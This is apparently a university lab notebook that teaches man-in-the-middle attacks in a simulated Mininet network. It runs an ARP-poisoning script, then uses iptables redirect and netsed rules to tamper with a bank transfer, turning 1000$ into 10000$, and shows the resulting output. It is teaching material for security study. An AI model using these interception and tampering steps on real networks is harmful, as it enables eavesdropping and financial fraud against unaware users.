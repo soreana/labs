{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Man In The Middle (MIM)\n",
    "\n",
    "A man-in-the-middle attack is a type of cyberattack where a malicious actor inserts him/herself into a conversation between two parties, impersonates both parties and gains access to information that the two parties were trying to send to each other. A man-in-the-middle attack allows a malicious actor to intercept, send and receive data meant for someone else, or not meant to be sent at all, without either outside party knowing until it is too late. Man-in-the-middle attacks can be abbreviated in many ways, including MITM, MitM, MiM or MIM. [[1]](https://www.veracode.com/security/man-middle-attack)\n",
    "\n",
    "The remainder of this lab is organized as follows: we provide a review of MIM in Section 1. Further, we present a thorough explanation about how we can intercept network flow and related subjects of the MIM attack in Section 2. In Sections 3, we present how attacker can modifying HTTP request (or any unencrypted packets) after network interception. In Section 4, Alice and Bob use Diffie–Hellman to exchange secret keys and Eve use this algorithm deficiency to break their secure communication. Finally, in Section 5 we will have funny example.\n",
    "\n",
    "In each Section we will implement small sample to further explain each section.\n",
    "\n",
    "## Table of Contents\n",
    "1. [How does a man-in-the-middle attack work?](#1.-How-does-a-man-in-the-middle-attack-work%3F-%3Ca-href%3D%22https%3A%2F%2Fus.norton.com%2Finternetsecurity-wifi-what-is-a-man-in-the-middle-attack.html%22-rel%3D%22nofollow%22-target%3D%22_blank%22%3E%5B1%5D%3C%2Fa%3E)\n",
    "2. [Intercept Network Flow](#2.-Intercept-Network-Flow)\n",
    "3. [Modify HTTP requests](#3.-Modify-HTTP-requests)\n",
    "\n",
    "## 1. How does a man-in-the-middle attack work? [[1]](https://us.norton.com/internetsecurity-wifi-what-is-a-man-in-the-middle-attack.html)\n",
    "\n",
    "How does this play out? Let’s say you received an email that appeared to be from your bank, asking you to log in to your account to confirm your contact information. You click on a link in the email and are taken to what appears to be your bank’s website, where you log in and perform the requested task.\n",
    "\n",
    "In such a scenario, the man in the middle (MITM) sent you the email, making it appear to be legitimate. (This attack also involves phishing, getting you to click on the email appearing to come from your bank.) He also created a website that looks just like your bank’s website, so you wouldn’t hesitate to enter your login credentials after clicking the link in the email. But when you do that, you’re not logging into your bank account, you’re handing over your credentials to the attacker.\n",
    "\n",
    "### MITM attacks: Close to you or with malware\n",
    "\n",
    "Man-in-the-middle attacks come in two forms, one that involves physical proximity to the intended target, and another that involves malicious software, or malware. This second form, like our fake bank example above, is also called a man-in-the-browser attack.\n",
    "\n",
    "Cybercriminals typically execute a man-in-the-middle attack in two phases — interception and decryption.\n",
    "\n",
    "With a traditional MITM attack, the cybercriminal needs to gain access to an unsecured or poorly secured Wi-Fi router. These types of connections are generally found in public areas with free Wi-Fi hotspots, and even in some people’s homes, if they haven’t protected their network. Attackers can scan the router looking for specific vulnerabilities such as a weak password.\n",
    "\n",
    "Once attackers find a vulnerable router, they can deploy tools to intercept and read the victim’s transmitted data. The attacker can then also insert their tools between the victim’s computer and the websites the user visits to capture log in credentials, banking information, and other personal information.\n",
    "\n",
    "A successful man-in-the-middle attack does not stop at interception. The victim’s encrypted data must then be unencrypted, so that the attacker can read and act upon it.\n",
    "\n",
    "### What is a man-in-the-browser attack?\n",
    "\n",
    "With a man-in-the-browser attack (MITB), an attacker needs a way to inject malicious software, or malware, into the victim’s computer or mobile device. One of the ways this can be achieved is by phishing.\n",
    "\n",
    "Phishing is when a fraudster sends an email or text message to a user that appears to originate from trusted source, such as a bank, as in our original example. By clicking on a link or opening an attachment in the phishing message, the user can unwittingly load malware onto their device.\n",
    "\n",
    "The malware then installs itself on the browser without the user’s knowledge. The malware records the data sent between the victim and specific targeted websites, such as financial institutions, and transmits it to the attacker."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2. Intercept Network Flow\n",
    "\n",
    "In first step of **Man In The Middle attack**, Attacker (Eve) should intercepts victim (Bob) traffic through the attacker’s network before it reaches its intended destination. Attacker (Eve) may launch one of the following attacks to reach this goal:\n",
    "\n",
    "**IP spoofing:** involves an attacker disguising himself as an application by altering packet headers in an IP address. As a result, users attempting to access a URL connected to the application are sent to the attacker’s website. [[1]](https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/?utm_campaign=Incapsula-moved)\n",
    "\n",
    "**ARP spoofing:** also known as ARP Poisoning is the process of linking an attacker’s MAC address with the IP address of a legitimate user on a local area network using fake ARP messages. As a result, data sent by the user to the host IP address is instead transmitted to the attacker. [[1]](https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/?utm_campaign=Incapsula-moved)\n",
    "\n",
    "**DNS spoofing:** also known as DNS cache poisoning, involves infiltrating a DNS server and altering a website’s address record. As a result, users attempting to access the site are sent by the altered DNS record to the attacker’s site. [[1]](https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/?utm_campaign=Incapsula-moved)\n",
    "\n",
    "In this exercise we use ARP Poisoning techniq to intercept network flow from Bob to Alice.\n",
    "\n",
    "### ARP Poisoning\n",
    "\n",
    "ARP Poisoning is a type of attack in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in the linking of an attacker’s MAC address with the IP address of a server on the network. Once the attacker’s MAC address is connected to an authentic IP address, the attacker will begin receiving any data that is intended for that IP address. ARP poisoning can enable malicious parties to intercept, modify or even stop data intransit. ARP spoofing attacks can only occur on local area networks that utilize the Address Resolution Protocol. [[2](https://www.veracode.com/security/arp-spoofing)]\n",
    "\n",
    "This scenario illustrated in below pictures. (These images created by [Creatly](https://creatly.com))\n",
    "\n",
    "|     ‌                                          |                             |\n",
    "|:----------------------------------------------:|:---------------------------:|\n",
    "|![](./img/1-initial-setup.png)                  |![](./img/2-send-ARP.png)    |\n",
    "|![](./img/3-poisoned-tables.png)                |![](./img/4-packets-flow.png)|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Exercise One, ARP Poisoning\n",
    "\n",
    "**Note:** $\\color{blue}{\\text{(T)}}$ at the end of steps means you need output of that step to complete your lab report, don't forget to take screen shot.\n",
    "\n",
    "1. Run below script and wait untill mininet console show up.\n",
    "2. Run $\\color{#1E90FF}{\\text{`bob arp -a`}}$ and $\\color{#1E90FF}{\\text{`alice arp -a`}}$ in mininet console to check arp tables entry in Bob and Alice hosts. (Nothing will show up if it was empty)\n",
    "3. Ping Alice host from Bob to fill arp table. $\\color{#03C03C}{\\text{Hint: run}}$ $\\color{#177245}{\\text{`bob ping alice -c 3`}}$ \n",
    "4. Check arp tables again. $\\color{blue}{\\text{(T)}}$ $\\color{#03C03C}{\\text{Hint: Repeat step two.}}$\n",
    "5. Run $\\color{#1E90FF}{\\text{`eve python arp-poison.py &`}}$ to poison Alice and Bob.\n",
    "6. Check arp tables again. $\\color{blue}{\\text{(T)}}$ $\\color{#03C03C}{\\text{Hint: Repeat step two.}}$\n",
    "7. Open Scapy module in seperate window, and run **Exercise One, ARP Poison** cell to capture ping packets.\n",
    "8. Ping Alice host from Bob. $\\color{#03C03C}{\\text{Hint: Repeat step three.}}$\n",
    "9. Check scapy output and save it for your lab report. $\\color{blue}{\\text{(T)}}$\n",
    "\n",
    "#### Lab report\n",
    "\n",
    "* Explain ARP Poisoning attack justify your answer with Scapy output.\n",
    "* Attach arp tables to your lab report.\n",
    "* Why in the Scapy output we saw two **Echo Request** and then two **Echo Reply** not one **Echo Request** with one **Echo Reply** ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  alice arp -a\n",
      "mininet>  bob arp -a\n",
      "mininet>  bob ping alice -c 5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=2.28 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.280 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.068 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.138 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=5 ttl=64 time=0.056 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "5 packets transmitted, 5 received, 0% packet loss, time 4073ms\n",
      "rtt min/avg/max/mdev = 0.056/0.566/2.288/0.864 ms\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  alice arp -a\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "? (10.0.0.3) at 00:00:00:00:00:03 [ether] on alice-eth0\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob arp -a\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "? (10.0.0.1) at 00:00:00:00:00:01 [ether] on bob-eth0\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve python arp-poison.py &\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[1] 2158\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  alice arp -a\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "? (10.0.0.3) at 00:00:00:00:00:02 [ether] on alice-eth0\n",
      "? (10.0.0.2) at 00:00:00:00:00:02 [ether] on alice-eth0\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob arp -a\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "? (10.0.0.2) at 00:00:00:00:00:02 [ether] on bob-eth0\n",
      "? (10.0.0.1) at 00:00:00:00:00:02 [ether] on bob-eth0\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob ping alice -c 5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=63 time=5.93 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=63 time=0.578 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=63 time=0.096 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=4 ttl=63 time=0.078 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=5 ttl=63 time=0.071 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "5 packets transmitted, 5 received, 0% packet loss, time 4040ms\n",
      "rtt min/avg/max/mdev = 0.071/1.352/5.938/2.301 ms\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob ping alice -c 5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=63 time=0.542 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=63 time=0.081 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=63 time=0.084 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=4 ttl=63 time=0.080 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=5 ttl=63 time=0.098 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "5 packets transmitted, 5 received, 0% packet loss, time 4037ms\n",
      "rtt min/avg/max/mdev = 0.080/0.177/0.542/0.182 ms\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve ls\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[*] Starting script: arp_poison.py\n",
      "[*] Enabling IP forwarding\n",
      "sysctl: cannot stat /proc/sys/net/inet/ip/forwarding: No such file or directory\n",
      "0\n",
      "[*] Gateway IP address: set(['10.0.0.1'])\n",
      "[*] Target IP address: set(['10.0.0.3'])\n",
      "[*] Gateway MAC address: set(['00:00:00:00:00:01'])\n",
      "[*] Target MAC address: set(['00:00:00:00:00:03'])\n",
      "[*] Started ARP poison attack [CTRL-C to stop]\n",
      " [*] Starting network capture. Packet Count: set([1000]). Filter: set(['icmp or ip host 10.0.0.3'])\n",
      "RUNME.ipynb    devile.jpg\timg\t      web-server.ipynb\n",
      "Scapy.ipynb    get_image.ipynb\tresponse.jpg  web-server.py\n",
      "arp-poison.py  get_image.py\tresponse.txt\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob ping alice -c 5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=63 time=3.57 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=63 time=0.568 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=63 time=0.194 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=4 ttl=63 time=0.079 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=5 ttl=63 time=0.083 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "5 packets transmitted, 5 received, 0% packet loss, time 4047ms\n",
      "rtt min/avg/max/mdev = 0.079/0.900/3.577/1.350 ms\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob ping alice -c 5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=63 time=0.718 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=63 time=0.102 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=63 time=0.108 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=4 ttl=63 time=0.098 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=5 ttl=63 time=0.081 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "5 packets transmitted, 5 received, 0% packet loss, time 4030ms\n",
      "rtt min/avg/max/mdev = 0.081/0.221/0.718/0.248 ms\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob ping alice -c 5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=63 time=3.68 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=63 time=0.597 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=63 time=0.067 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=4 ttl=63 time=0.085 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=5 ttl=63 time=0.139 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "5 packets transmitted, 5 received, 0% packet loss, time 4004ms\n",
      "rtt min/avg/max/mdev = 0.067/0.915/3.688/1.400 ms\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob ping alice -c 3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n",
      "64 bytes from 10.0.0.1: icmp_seq=1 ttl=63 time=4.64 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=2 ttl=63 time=0.441 ms\n",
      "64 bytes from 10.0.0.1: icmp_seq=3 ttl=63 time=0.087 ms\n",
      "\n",
      "--- 10.0.0.1 ping statistics ---\n",
      "3 packets transmitted, 3 received, 0% packet loss, time 2002ms\n",
      "rtt min/avg/max/mdev = 0.087/1.723/4.641/2.068 ms\n"
     ]
    }
   ],
   "source": [
    "from mininet.net import Mininet\n",
    "from mininet.topo import Topo\n",
    "from mininet.link import TCLink  # So we can rate limit links\n",
    "from mininet.cli import CLI  # So we can bring up the Mininet CLI\n",
    "from mininet.clean import cleanup\n",
    "\n",
    "cleanup()\n",
    "\n",
    "topo = Topo()  # Create an empty topology\n",
    "\n",
    "# Add switches and hosts to the topology\n",
    "topo.addSwitch(\"s1\")\n",
    "topo.addHost(\"alice\",mac='00:00:00:00:00:01',ip='10.0.0.1')\n",
    "topo.addHost(\"eve\",mac='00:00:00:00:00:02',ip='10.0.0.2')\n",
    "topo.addHost(\"bob\",mac='00:00:00:00:00:03',ip='10.0.0.3')\n",
    "\n",
    "# Wire the switches and hosts together\n",
    "topo.addLink(\"alice\", \"s1\")\n",
    "topo.addLink(\"eve\", \"s1\")\n",
    "topo.addLink(\"bob\", \"s1\")\n",
    "\n",
    "net = Mininet(topo=topo, link=TCLink)\n",
    "net.start()\n",
    "\n",
    "CLI(net)  # Bring up the mininet CLI\n",
    "\n",
    "net.stop()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "\n",
    "#### Colors: (todo remove this section)\n",
    "$\\color{#00B7EB}{\\text{`eve python arp-poison.py &`}}$\n",
    "\n",
    "$\\color{#1E90FF}{\\text{`eve python arp-poison.py &`}}$\n",
    "\n",
    "$\\color{blue}{\\text{`eve python arp-poison.py &`}}$\n",
    "\n",
    "$\\color{#03C03C}{\\text{`eve python arp-poison.py &`}}$\n",
    "\n",
    "$\\color{#177245}{\\text{`eve python arp-poison.py &`}}$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Modify HTTP requests\n",
    "\n",
    "https://serverfault.com/questions/318960/easy-way-to-edit-the-traffic-coming-from-a-tcp-host-linux\n",
    "https://blog.wains.be/2016/2016-03-17-netsed-stream-editor/\n",
    "\n",
    "1. bob python set_password.py bank 1234\n",
    "2. bob python transfer.py bank 1000$ 1234\n",
    "3. eve python arp-poison.py &"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob python set_password.py bank 1234\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Password was set.\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve python arp-poison.py &\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[1] 11531\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve iptables -t nat -D PREROUTING -s 10.0.0.3 -d 10.0.0.1 -p tcp --dport 80 -j REDIRECT --to 10101\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[*] Starting script: arp_poison.py\n",
      "[*] Enabling IP forwarding\n",
      "sysctl: cannot stat /proc/sys/net/inet/ip/forwarding: No such file or directory\n",
      "0\n",
      "[*] Gateway IP address: set(['10.0.0.1'])\n",
      "[*] Target IP address: set(['10.0.0.3'])\n",
      "[*] Gateway MAC address: set(['00:00:00:00:00:01'])\n",
      "[*] Target MAC address: set(['00:00:00:00:00:03'])\n",
      "[*] Started ARP poison attack [CTRL-C to stop]\n",
      " [*] Starting network capture. Packet Count: set([10]). Filter: set(['icmp or ip host 10.0.0.3'])\n",
      "iptables: No chain/target/match by that name.\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve netsed tcp 10101 10.0.0.1 80 s/00$/000$\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>\n",
      "      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>\n",
      "[*] Parsing rule s/00$/000$...\n",
      "[+] Loaded 1 rule...\n",
      "[+] Using fixed forwarding to 10.0.0.1,80.\n",
      "[+] Listening on port 10101/tcp.\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve iptables -t nat -D PREROUTING -s 10.0.0.3 -d 10.0.0.1 -p tcp --dport 80 -j REDIRECT --to 10101\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "iptables: No chain/target/match by that name.\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  eve iptables -t nat -A PREROUTING -s 10.0.0.3 -d 10.0.0.1 -p tcp --dport 80 -j REDIRECT --to 10101\n",
      "mininet>  eve netsed tcp 10101 10.0.0.1 80 s/00$/000$ &\n",
      "mininet>  bob python transfer.py bank 1000$ 1234\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Transfered 10000$ successfully.\n"
     ]
    }
   ],
   "source": [
    "from mininet.net import Mininet\n",
    "from mininet.topo import Topo\n",
    "from mininet.link import TCLink  # So we can rate limit links\n",
    "from mininet.cli import CLI  # So we can bring up the Mininet CLI\n",
    "from mininet.clean import cleanup\n",
    "\n",
    "cleanup()\n",
    "\n",
    "topo = Topo()  # Create an empty topology\n",
    "\n",
    "# Add switches and hosts to the topology\n",
    "topo.addSwitch(\"s1\")\n",
    "topo.addHost(\"bank\",mac='00:00:00:00:00:01',ip='10.0.0.1')\n",
    "topo.addHost(\"eve\",mac='00:00:00:00:00:02',ip='10.0.0.2')\n",
    "topo.addHost(\"bob\",mac='00:00:00:00:00:03',ip='10.0.0.3')\n",
    "\n",
    "# Wire the switches and hosts together\n",
    "topo.addLink(\"bank\", \"s1\")\n",
    "topo.addLink(\"eve\", \"s1\")\n",
    "topo.addLink(\"bob\", \"s1\")\n",
    "\n",
    "net = Mininet(topo=topo, link=TCLink)\n",
    "net.start()\n",
    "\n",
    "# Run bank web server\n",
    "net.get(\"bank\").cmd(\"python web-server.py &\")\n",
    "\n",
    "CLI(net)  # Bring up the mininet CLI\n",
    "\n",
    "net.stop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob python transfer.py bank 1000$ 1234\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Transfered 1000$ successfully.\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "mininet>  bob python transfer.py bank 1000$ 1234\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Transfered 1000$ successfully.\n"
     ]
    }
   ],
   "source": [
    "from mininet.net import Mininet\n",
    "from mininet.topo import Topo\n",
    "from mininet.link import TCLink  # So we can rate limit links\n",
    "from mininet.cli import CLI  # So we can bring up the Mininet CLI\n",
    "from mininet.clean import cleanup\n",
    "\n",
    "cleanup()\n",
    "\n",
    "topo = Topo()  # Create an empty topology\n",
    "\n",
    "# Add switches and hosts to the topology\n",
    "topo.addSwitch(\"s1\")\n",
    "topo.addHost(\"bank\",mac='00:00:00:00:00:01',ip='10.0.0.1')\n",
    "topo.addHost(\"eve\",mac='00:00:00:00:00:02',ip='10.0.0.2')\n",
    "topo.addHost(\"bob\",mac='00:00:00:00:00:03',ip='10.0.0.3')\n",
    "\n",
    "# Wire the switches and hosts together\n",
    "topo.addLink(\"bank\", \"s1\")\n",
    "topo.addLink(\"eve\", \"s1\")\n",
    "topo.addLink(\"bob\", \"s1\")\n",
    "\n",
    "net = Mininet(topo=topo, link=TCLink)\n",
    "net.start()\n",
    "\n",
    "# Run bank web server\n",
    "net.get(\"bank\").cmd(\"python web-server.py &\")\n",
    "net.get(\"bob\").cmd(\"python set_password.py 10.0.0.1 1234\")\n",
    "net.get(\"eve\").cmd(\"python arp-poison.py &\")\n",
    "net.get(\"eve\").cmd(\"iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 0\")\n",
    "net.get(\"eve\").cmd(\"python test.py > out.txt &\")\n",
    "\n",
    "CLI(net)  # Bring up the mininet CLI\n",
    "\n",
    "net.stop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.16"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
